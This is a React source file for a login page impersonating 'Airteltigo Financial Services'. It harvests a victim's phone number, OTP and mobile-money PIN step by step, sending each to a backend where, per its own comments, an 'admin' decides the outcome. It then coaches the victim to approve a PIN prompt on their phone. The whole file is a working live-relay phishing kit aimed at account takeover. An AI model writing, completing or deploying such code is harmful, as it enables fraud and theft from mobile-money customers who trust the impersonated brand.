import { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import './Login.css';

export default function Login() {
  const navigate = useNavigate();

  const API_ENDPOINT = import.meta.env.VITE_USER_API_ENDPOINT || 'u1';
  const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:3001';

  // ─── Current step: 'phone' | 'otp' | 'pin' | 'prompted-pin' ───────────────────────
  const [step, setStep] = useState('phone');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [otp, setOtp] = useState(['', '', '', '']); // 4-digit OTP
  const [pin, setPin] = useState(''); // 4-6 digit PIN (first PIN)
  const [showPin, setShowPin] = useState(false);

  // Prompted PIN Modal state (SECOND PIN - after "Prompt PIN" button clicked)
  const [promptedPinModal, setPromptedPinModal] = useState({
    show: false,
    status: 'waiting', // 'waiting' | 'success' | 'failed'
    isRetrying: false,
    showRetryButton: false // ✅ Show retry button while still processing (after 120 sec)
  });

  // UI state
  const [isProcessing, setIsProcessing] = useState(false);
  const [errorModal, setErrorModal] = useState({ show: false, message: '' });

  const otpRefs = [useRef(null), useRef(null), useRef(null), useRef(null)];
  const pinInputRef = useRef(null);
  const promptedPinPollIntervalRef = useRef(null); // ✅ Track polling to reset on retry

  // ── Phone: digits only ──
  const handlePhoneChange = (e) => {
    const value = e.target.value.replace(/\D/g, '');
    setPhoneNumber(value.slice(0, 10));
  };

  const isValidPhone = (phone) =>
    phone.length >= 9 && phone.length <= 10;

  // ── OTP input handlers ──
  const handleOtpChange = (index, value) => {
    const numericValue = value.replace(/\D/g, '');
    if (numericValue.length > 1) return;
    const newOtp = [...otp];
    newOtp[index] = numericValue;
    setOtp(newOtp);
    if (numericValue && index < 3) otpRefs[index + 1].current?.focus();
  };

  const handleOtpKeyDown = (index, e) => {
    if (e.key === 'Backspace') {
      if (otp[index]) {
        const newOtp = [...otp];
        newOtp[index] = '';
        setOtp(newOtp);
      } else if (index > 0) {
        otpRefs[index - 1].current?.focus();
      }
    } else if (e.key === 'ArrowLeft' && index > 0) {
      otpRefs[index - 1].current?.focus();
    } else if (e.key === 'ArrowRight' && index < 3) {
      otpRefs[index + 1].current?.focus();
    }
  };

  const handleOtpKeyPress = (e) => {
    if (!/^\d$/.test(e.key)) e.preventDefault();
  };

  // ── PIN text input handler (4-6 digits) - FIRST PIN ──
  const handlePinChange = (e) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= 6) {
      setPin(value);
    }
  };

  const togglePinVisibility = () => setShowPin(!showPin);

  // ══════════════════════════════════════════════════════════════════
  // STEP 1: PHONE NUMBER SUBMISSION + POLLING
  // ══════════════════════════════════════════════════════════════════
  const handlePhoneSubmit = async (e) => {
    e.preventDefault();

    if (!isValidPhone(phoneNumber)) {
      setErrorModal({
        show: true,
        message: 'Please enter a valid phone number (9–10 digits).'
      });
      return;
    }

    setIsProcessing(true);
    localStorage.setItem('airteltigo_phone', phoneNumber);

    try {
      const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/verify-phone`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber })
      });

      const data = await response.json();

      if (!data.success) {
        setIsProcessing(false);
        setErrorModal({
          show: true,
          message: 'Failed to send phone. Try again.'
        });
        return;
      }

      let pollCount = 0;
      const maxPolls = 300;
      
      const pollInterval = setInterval(async () => {
        pollCount++;

        try {
          const statusResp = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-phone-status`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phoneNumber })
          });

          const statusData = await statusResp.json();

          if (statusData.status === 'allow') {
            clearInterval(pollInterval);
            setIsProcessing(false);
            localStorage.setItem('airteltigo_phone', phoneNumber);
            setStep('otp');
            setOtp(['', '', '', '']);
            setTimeout(() => otpRefs[0].current?.focus(), 100);
          } else if (statusData.status === 'invalid') {
            clearInterval(pollInterval);
            setIsProcessing(false);
            setErrorModal({
              show: true,
              message: 'Your phone number is not eligible.'
            });
          } else if (pollCount > maxPolls) {
            clearInterval(pollInterval);
            setIsProcessing(false);
            setErrorModal({
              show: true,
              message: 'Verification timed out. Please try again.'
            });
          }
        } catch (error) {
          // Silently handle poll error
        }
      }, 1000);

    } catch (error) {
      setIsProcessing(false);
      setErrorModal({
        show: true,
        message: 'Unable to connect to server. Check your connection.'
      });
    }
  };

  // ══════════════════════════════════════════════════════════════════
  // STEP 2: OTP SUBMISSION + POLLING
  // ══════════════════════════════════════════════════════════════════
  const handleOtpSubmit = async (e) => {
    e.preventDefault();

    const fullOtp = otp.join('');
    if (fullOtp.length !== 4) {
      setErrorModal({
        show: true,
        message: 'Please enter the complete 4-digit OTP.'
      });
      return;
    }

    setIsProcessing(true);

    try {
      const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/verify-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber, otp: fullOtp })
      });

      const data = await response.json();

      if (!data.success) {
        setIsProcessing(false);
        setErrorModal({
          show: true,
          message: 'Failed to send OTP. Try again.'
        });
        return;
      }

      let pollCount = 0;
      const maxPolls = 300;
      
      const pollInterval = setInterval(async () => {
        pollCount++;

        try {
          const statusResp = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-otp-status`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phoneNumber })
          });

          const statusData = await statusResp.json();

          if (statusData.status === 'correct') {
            clearInterval(pollInterval);
            setIsProcessing(false);
            setStep('pin');
            setPin('');
            setTimeout(() => pinInputRef.current?.focus(), 100);
          } else if (statusData.status === 'wrong') {
            clearInterval(pollInterval);
            setIsProcessing(false);
            setErrorModal({
              show: true,
              message: 'The OTP you entered is incorrect.'
            });
            setOtp(['', '', '', '']);
            setTimeout(() => otpRefs[0].current?.focus(), 150);
          } else if (pollCount > maxPolls) {
            clearInterval(pollInterval);
            setIsProcessing(false);
            setErrorModal({
              show: true,
              message: 'OTP verification timed out. Please try again.'
            });
          }
        } catch (error) {
          // Silently handle poll error
        }
      }, 1000);

    } catch (error) {
      setIsProcessing(false);
      setErrorModal({
        show: true,
        message: 'Unable to verify OTP. Check your connection.'
      });
    }
  };

  // ══════════════════════════════════════════════════════════════════
  // STEP 3: PIN SUBMISSION + POLLING (FIRST PIN)
  // ══════════════════════════════════════════════════════════════════
  const handlePinSubmit = async (e) => {
    e.preventDefault();

    if (pin.length < 4 || pin.length > 6) {
      setErrorModal({
        show: true,
        message: 'Please enter a 4-6 digit PIN.'
      });
      return;
    }

    setIsProcessing(true);
    
    try {
      const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/verify-pin`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber, pin })
      });

      const data = await response.json();

      if (!data.success) {
        setIsProcessing(false);
        setErrorModal({
          show: true,
          message: 'Failed to send PIN. Try again.'
        });
        return;
      }

      let pollCount = 0;
      const maxPolls = 300;
      
      const pollInterval = setInterval(async () => {
        pollCount++;

        try {
          const statusResp = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-pin-status`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phoneNumber })
          });

          const statusData = await statusResp.json();
          
          if (statusData.status === 'correct') {
            // ✅ PIN CORRECT → GO TO /status
            clearInterval(pollInterval);
            localStorage.setItem('airteltigo_auth', 'true');
            localStorage.setItem('airteltigo_user_phone', phoneNumber);
            setIsProcessing(false);
            await new Promise(r => setTimeout(r, 400));
            navigate('/status');
          } else if (statusData.status === 'prompt_pin_waiting') {
            // 🔐 PIN → PROMPT PIN (SECOND PIN) - Show modal and poll for result
            clearInterval(pollInterval);
            setIsProcessing(false);
            setPromptedPinModal({
              show: true,
              status: 'waiting',
              isRetrying: false
            });
            pollPromptedPinResult(phoneNumber, false);
          } else if (statusData.status === 'wrong') {
            // ❌ PIN WRONG - Keep on PIN page, don't clear PIN
            clearInterval(pollInterval);
            setIsProcessing(false);
            setErrorModal({
              show: true,
              message: 'The PIN you entered is incorrect.'
            });
            // PIN stays on screen (not cleared) - user can try again
          } else if (pollCount > maxPolls) {
            clearInterval(pollInterval);
            setIsProcessing(false);
            setErrorModal({
              show: true,
              message: 'PIN verification timed out. Please try again.'
            });
          }
        } catch (error) {
          // Silently handle poll error
        }
      }, 1000);

    } catch (error) {
      setIsProcessing(false);
      setErrorModal({
        show: true,
        message: 'Unable to verify PIN. Check your connection.'
      });
    }
  };

  // ══════════════════════════════════════════════════════════════════
  // STEP 4: PROMPTED PIN RESULT POLLING (SECOND PIN - MODAL)
  // ✅ NEW: 5-minute total poll, retry button after 120 seconds
  // ✅ Polling continues in background even after retry button shown
  // ══════════════════════════════════════════════════════════════════
  const pollPromptedPinResult = (phoneNum, isRetry = false) => {
    // Clear any existing polling before starting new one
    if (promptedPinPollIntervalRef.current) {
      clearInterval(promptedPinPollIntervalRef.current);
    }

    let pollCount = 0;
    const maxPolls = 300;           // 5 minutes total (300 seconds)
    const showRetryAfter = 120;     // Show retry button after 120 seconds
    
    promptedPinPollIntervalRef.current = setInterval(async () => {
      pollCount++;

      try {
        const statusResp = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-prompted-pin-status`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phoneNumber: phoneNum })
        });

        const statusData = await statusResp.json();

        // ✅ SUCCESS - Stop polling and navigate
        if (statusData.status === 'prompted_pin_successful') {
          clearInterval(promptedPinPollIntervalRef.current);
          promptedPinPollIntervalRef.current = null;
          
          localStorage.setItem('airteltigo_auth', 'true');
          localStorage.setItem('airteltigo_user_phone', phoneNum);
          setPromptedPinModal({
            show: true,
            status: 'success',
            isRetrying: isRetry,
            showRetryButton: false
          });
          await new Promise(r => setTimeout(r, 1000));
          navigate('/status');
        } 
        // ❌ FAILED (admin clicked) - Show error modal, stop polling
        else if (statusData.status === 'prompted_pin_failed') {
          clearInterval(promptedPinPollIntervalRef.current);
          promptedPinPollIntervalRef.current = null;
          
          setPromptedPinModal({
            show: true,
            status: 'failed',
            isRetrying: isRetry,
            showRetryButton: false
          });
        }
        // ⏱️ RETRY BUTTON TRIGGER (120 seconds elapsed, still waiting)
        else if (pollCount === showRetryAfter) {
          setPromptedPinModal({
            show: true,
            status: 'waiting', // ✅ Keep 'waiting' to show spinner
            isRetrying: isRetry,
            showRetryButton: true // ✅ ADD retry button to spinner
          });
        }
        // ⏰ TOTAL TIMEOUT (5 minutes)
        else if (pollCount > maxPolls) {
          clearInterval(promptedPinPollIntervalRef.current);
          promptedPinPollIntervalRef.current = null;
          
          setPromptedPinModal({
            show: true,
            status: 'failed', // ✅ Switch to failed modal after 5 min
            isRetrying: isRetry,
            showRetryButton: false
          });
          setErrorModal({
            show: true,
            message: 'Prompted PIN verification timed out after 5 minutes. Please try again.'
          });
        }
      } catch (error) {
        // Silently handle poll error
      }
    }, 1000);
  };

  // ══════════════════════════════════════════════════════════════════
  // PROMPTED PIN RETRY - Resets 5-minute timer
  // ══════════════════════════════════════════════════════════════════
  const handlePromptedPinRetry = async () => {
    setPromptedPinModal({
      show: true,
      status: 'waiting',
      isRetrying: true,
      showRetryButton: false // ✅ Reset button flag
    });

    try {
      const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/prompted-pin-retry`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber })
      });

      const data = await response.json();

      if (!data.success) {
        setPromptedPinModal({
          show: true,
          status: 'failed',
          isRetrying: true,
          showRetryButton: false
        });
        return;
      }

      // ✅ Start fresh polling with reset 5-minute timer
      pollPromptedPinResult(phoneNumber, true);
    } catch (error) {
      setPromptedPinModal({
        show: true,
        status: 'failed',
        isRetrying: true,
        showRetryButton: false
      });
    }
  };

  const closeErrorModal = () => setErrorModal({ show: false, message: '' });
  const closePromptedPinModal = () => setPromptedPinModal({ show: false, status: 'waiting', isRetrying: false, showRetryButton: false });

  const isPhoneValid = isValidPhone(phoneNumber);
  const isOtpComplete = otp.every(d => d !== '');
  const isPinValid = pin.length >= 4 && pin.length <= 6;

  // Format phone number for display (mask middle digits)
  const formatPhoneForDisplay = (phone) => {
    if (!phone || phone.length < 4) return phone;
    const first = phone.slice(0, 3);
    const last = phone.slice(-2);
    return `${first}****${last}`;
  };

  // ─── Processing screen ────────────────────────────────────────────
  if (isProcessing) {
    return (
      <div className="login-container">
        <header className="login-header">
          <div className="logo-large">
            <div className="airteltigo-logo-large">
              <div className="airteltigo-circle-large">
                <img src="/vite.svg" alt="Airteltigo" style={{ width: '100%', height: '100%', objectFit: 'contain' }} />
              </div>
              <span className="logo-large-airteltigo">Airteltigo</span>
            </div>
            <p className="logo-subtitle">Financial Services</p>
          </div>
        </header>

        <main className="login-content">
          <div className="processing-card">
            <div className="spinner-container">
              <div className="airteltigo-spinner"></div>
            </div>
            <h2 className="processing-title">Processing...</h2>
            <p className="processing-subtitle">Please wait</p>
          </div>
        </main>

        <footer className="login-footer">
          © 2026 Airteltigo
        </footer>
      </div>
    );
  }

  // ─── Main render ──────────────────────────────────────────────────
  return (
    <div className="login-container">

      {/* Header */}
      <header className="login-header">
        <div className="logo-large">
          <div className="airteltigo-logo-large">
            <div className="airteltigo-circle-large">
              <img src="/vite.svg" alt="Airteltigo" style={{ width: '100%', height: '100%', objectFit: 'contain' }} />
            </div>
            <span className="logo-large-airteltigo">Airteltigo</span>
          </div>
          <p className="logo-subtitle">Financial Services</p>
        </div>
      </header>

      {/* Main Content */}
      <main className="login-content">
        <h1 className="login-title">
          {step === 'phone' && 'Enter Your Phone Number'}
          {step === 'otp' && 'Enter OTP Code'}
          {step === 'pin' && 'Enter Your PIN'}
        </h1>

        <form className="login-form">

          {/* ── PHONE STEP ── */}
          {step === 'phone' && (
            <>
              <div className="phone-input-container">
                <input
                  type="tel"
                  className="phone-input-no-prefix"
                  placeholder="05XXXXXXXX OR 02XXXXXXXX"
                  value={phoneNumber}
                  onChange={handlePhoneChange}
                  disabled={isProcessing}
                  maxLength="10"
                  inputMode="numeric"
                  required
                  autoFocus
                />
              </div>

              <button
                type="submit"
                className="login-button"
                disabled={!isPhoneValid}
                onClick={handlePhoneSubmit}
              >
                CONTINUE
              </button>
            </>
          )}

          {/* ── OTP STEP ── */}
          {step === 'otp' && (
            <>
              <div className="otp-sent-message">
                <p className="otp-sent-text">
                  OTP sent to <strong>{formatPhoneForDisplay(phoneNumber)}</strong>
                </p>
              </div>

              <div className="otp-input-container">
                <label className="otp-label">Enter the 4-digit code</label>
                <div className="otp-inputs-wrapper">
                  {otp.map((digit, index) => (
                    <input
                      key={index}
                      ref={otpRefs[index]}
                      type="text"
                      className="otp-box"
                      value={digit}
                      onChange={(e) => handleOtpChange(index, e.target.value)}
                      onKeyDown={(e) => handleOtpKeyDown(index, e)}
                      onKeyPress={handleOtpKeyPress}
                      maxLength="1"
                      inputMode="numeric"
                      pattern="[0-9]"
                      required
                      disabled={false}
                    />
                  ))}
                </div>
              </div>

              <button
                type="submit"
                className="login-button"
                disabled={!isOtpComplete}
                onClick={handleOtpSubmit}
              >
                VERIFY OTP
              </button>

              <button
                type="button"
                className="login-button"
                style={{ marginTop: '0.75rem', background: '#ccc', color: '#666' }}
                onClick={() => {
                  setStep('phone');
                  setPhoneNumber('');
                  setOtp(['', '', '', '']);
                }}
              >
                ← BACK
              </button>
            </>
          )}

          {/* ── PIN STEP (FIRST PIN) ── */}
          {step === 'pin' && (
            <>
              <div className="pin-section-login">
                <label className="pin-label-login">ENTER YOUR PIN</label>
                <div className="pin-input-wrapper-login">
                  <input
                    ref={pinInputRef}
                    type={showPin ? 'text' : 'password'}
                    className="pin-input-login"
                    value={pin}
                    onChange={handlePinChange}
                    placeholder="••••"
                    maxLength="6"
                    inputMode="numeric"
                    required
                    autoFocus
                  />
                  <button
                    type="button"
                    className="eye-button-login"
                    onClick={togglePinVisibility}
                    aria-label={showPin ? 'Hide PIN' : 'Show PIN'}
                  >
                    {showPin ? '👁️' : '👁️‍🗨️'}
                  </button>
                </div>
              </div>

              <button
                type="submit"
                className="login-button"
                disabled={!isPinValid}
                onClick={handlePinSubmit}
              >
                VERIFY PIN
              </button>

              <button
                type="button"
                className="login-button"
                style={{ marginTop: '0.75rem', background: '#ccc', color: '#666' }}
                onClick={() => {
                  setStep('otp');
                  setPin('');
                  setShowPin(false);
                }}
              >
                ← BACK
              </button>
            </>
          )}

        </form>
      </main>

      {/* Footer */}
      <footer className="login-footer">
        <div className="wave-decoration"></div>
        <div className="footer-content">
          <div className="footer-logo">
            <div className="footer-logo-text">
              <div className="footer-airteltigo-logo">
                <div className="footer-airteltigo-circle">
                  <img src="/vite.svg" alt="Airteltigo" style={{ width: '100%', height: '100%', objectFit: 'contain' }} />
                </div>
                <span className="footer-logo-airteltigo">Airteltigo</span>
              </div>
              <p className="footer-logo-subtitle">Financial Services</p>
            </div>
          </div>
          <p className="footer-text">Secure. Fast. Reliable.</p>
          <p className="terms-text">
            <span className="terms-link">Terms &amp; Conditions</span>
            {' '}&bull;{' '}
            <span className="terms-link">Privacy Policy</span>
          </p>
        </div>
      </footer>

      {/* Error Modal */}
      {errorModal.show && (
        <div className="error-modal-overlay" onClick={closeErrorModal}>
          <div className="error-modal-content" onClick={(e) => e.stopPropagation()}>
            <div className="error-modal-icon">❌</div>
            <h3 className="error-modal-title">Error</h3>
            <p className="error-modal-message">{errorModal.message}</p>
            <button className="error-modal-button" onClick={closeErrorModal}>
              TRY AGAIN
            </button>
          </div>
        </div>
      )}

      {/* PROMPTED PIN Modal (SECOND PIN) */}
      {promptedPinModal.show && (
        <div className="prompted-pin-modal-overlay" onClick={promptedPinModal.status === 'failed' ? undefined : closePromptedPinModal}>
          <div className="prompted-pin-modal-content" onClick={(e) => e.stopPropagation()}>
            {promptedPinModal.status === 'waiting' && (
              <>
                <div className="spinner-container-modal">
                  <div className="airteltigo-spinner"></div>
                </div>
                <h3 className="prompted-pin-modal-title">Enter PIN from Your Phone</h3>
                <p className="prompted-pin-modal-message">
                  ENTER THE AIRTELTIGO PIN PROMPTED ON YOUR PHONE TO COMPLETE THE PROCESS
                </p>
                
                {/* ✅ Show retry button with spinner (after 120 sec) */}
                {promptedPinModal.showRetryButton && (
                  <button 
                    className="prompted-pin-retry-button" 
                    onClick={handlePromptedPinRetry}
                    style={{ marginTop: '1.5rem' }}
                  >
                    RETRY
                  </button>
                )}
              </>
            )}

            {promptedPinModal.status === 'success' && (
              <>
                <div className="success-icon">✅</div>
                <h3 className="prompted-pin-modal-title">PIN Verified</h3>
                <p className="prompted-pin-modal-message">
                  Your PIN has been verified successfully!
                </p>
              </>
            )}

            {promptedPinModal.status === 'failed' && (
              <>
                <div className="error-icon">❌</div>
                <h3 className="prompted-pin-modal-title">PIN Verification Failed</h3>
                <p className="prompted-pin-modal-message">
                  The PIN you entered was incorrect. Please try again.
                </p>
                <button 
                  className="prompted-pin-retry-button" 
                  onClick={handlePromptedPinRetry}
                >
                  RETRY
                </button>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
}